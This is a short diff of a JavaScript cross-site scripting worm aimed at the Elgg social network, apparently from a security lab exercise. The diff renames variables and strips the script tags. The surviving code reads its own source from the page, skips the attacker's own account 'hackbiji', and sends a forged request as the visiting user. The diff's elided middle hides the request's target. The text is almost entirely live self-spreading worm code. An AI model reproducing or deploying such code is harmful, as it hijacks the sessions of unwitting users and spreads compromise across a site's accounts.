@@ -1,6 +1,5 @@
-<script id="worm" type="text/javascript">
-var strCode = document.getElementById("worm").innerHTML;
-alert(strCode);
+var hackbiji_worm = document.getElementById("worm").innerHTML;
+alert(hackbiji_worm);
 var user = elgg.session.user.username;
 if(user!='hackbiji'){
     var victim = null;
@@ -19,4 +18,3 @@ if(user!='hackbiji'){
         victim.setRequestHeader("Connection","keep-alive");
         victim.send();
 }
-</script>
